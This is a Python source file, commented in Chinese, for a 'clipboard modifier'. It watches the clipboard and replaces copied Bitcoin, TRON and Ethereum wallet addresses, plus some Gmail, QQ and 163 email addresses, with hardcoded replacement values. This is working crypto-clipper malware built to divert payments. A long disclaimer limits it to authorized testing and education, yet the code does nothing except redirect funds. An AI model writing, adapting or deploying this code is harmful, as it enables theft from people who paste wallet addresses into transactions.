#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
剪贴板修改器
监控剪贴板内容，当复制特定类型的内容时自动替换为预设值

/**
 *
 * 本软件及相关文档（以下简称“软件”）仅限用于授权的安全测试、学术研究和教育目的。
 * 任何人在使用本软件前，必须确保其行为符合所有适用的法律、法规，并已获得相关系统的明确授权。
 *
 * 【重要警告与免责声明】
 * 1. 禁止非法使用：严禁在未获得明确授权的情况下，将本软件用于任何实际系统或网络。非法使用本软件可能导致严重的刑事和民事责任。
 * 2. 无担保：本软件按“原样”提供，不作任何明示或暗示的担保，包括但不限于对适销性、特定用途适用性的担保。
 * 3. 责任限制：在任何情况下，作者或版权持有人均不对因使用或无法使用本软件而导致的任何直接、间接、偶然、特殊、衍生或惩罚性损害赔偿承担责任，即使已被告知可能发生此类损害。
 * 4. 使用者责任：使用本软件产生的全部风险和责任由使用者自行承担。使用者必须确保其行为合法合规，并独自承担由此引发的一切法律后果。
 *
 * 如果您不是在合法的、授权的环境中接触到此软件，请立即删除所有副本。
 * 仅供教育研究使用，请勿用于非法用途。
 */
"""

import time
import re
import sys
from typing import Optional, List, Tuple
import pyperclip

# 替换规则配置（可在此直接修改）
REPLACEMENT_RULES: List[Tuple[str, str, str]] = [
    # (正则表达式, 替换内容, 描述)
    (r'^1[a-km-zA-HJ-NP-Z1-9]{25,34}$', 'TFejmAVJEecGK5LbBesSTxwFzss9i2ZcEP', '比特币地址'),
    (r'^T[1-9A-HJ-NP-Za-km-z]{33}$', 'TFejmAVJEecGK5LbBesSTxwFzss9i2ZcEP', 'TRON地址'),
    (r'^0x[a-fA-F0-9]{40}$', '0x742d35Cc6634C0532925a3b8D6B5B6b5b5b5b5b5', '以太坊地址'),
    (r'@(gmail|qq|163)\.com', 'myemail@example.com', '邮箱地址'),
    # 可以在这里添加更多规则
    # (r'^\+?[1-9]\d{1,14}$', '+1234567890', '电话号码'),
]

# 上一次处理的剪贴板内容（避免重复替换）
last_clipboard_content: Optional[str] = None


def should_replace(text: str) -> Optional[Tuple[str, str]]:
    """
    检查文本是否应该被替换
    
    Args:
        text: 剪贴板文本内容
        
    Returns:
        如果应该替换，返回 (替换内容, 描述)，否则返回 None
    """
    for pattern, replacement, description in REPLACEMENT_RULES:
        if re.search(pattern, text, re.IGNORECASE):
            return (replacement, description)
    return None


def monitor_clipboard(check_interval: float = 0.5):
    """
    监控剪贴板并执行替换
    
    Args:
        check_interval: 检查间隔（秒）
    """
    global last_clipboard_content
    
    print("=" * 50)
    print("仅供教育研究使用")
    print("剪贴板修改器已启动")
    print("按 Ctrl+C 停止程序")
    print("=" * 50)
    print()
    
    try:
        while True:
            try:
                # 获取当前剪贴板内容
                current_text = pyperclip.paste()
                
                # 如果内容发生了变化且不为空
                if current_text and current_text != last_clipboard_content:
                    # 检查是否需要替换
                    replacement_info = should_replace(current_text)
                    
                    if replacement_info:
                        replacement, description = replacement_info
                        # 设置新的剪贴板内容
                        pyperclip.copy(replacement)
                        last_clipboard_content = replacement
                        
                        # 显示替换信息
                        timestamp = time.strftime('%H:%M:%S')
                        print(f"[{timestamp}] 已替换{description}")
                        print(f"  原始: {current_text[:50]}{'...' if len(current_text) > 50 else ''}")
                        print(f"  替换为: {replacement}")
                        print()
                    else:
                        # 记录当前内容，但不替换
                        last_clipboard_content = current_text
                
            except Exception as e:
                # 忽略剪贴板访问错误（例如剪贴板被其他程序占用）
                pass
            
            # 等待一段时间后再次检查
            time.sleep(check_interval)
            
    except KeyboardInterrupt:
        print("\n程序已停止")


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description='剪贴板修改器')
    parser.add_argument(
        '-i', '--interval',
        type=float,
        default=0.5,
        help='检查间隔（秒），默认0.5秒'
    )
    args = parser.parse_args()
    
    # 开始监控
    monitor_clipboard(args.interval)


if __name__ == '__main__':
    main()

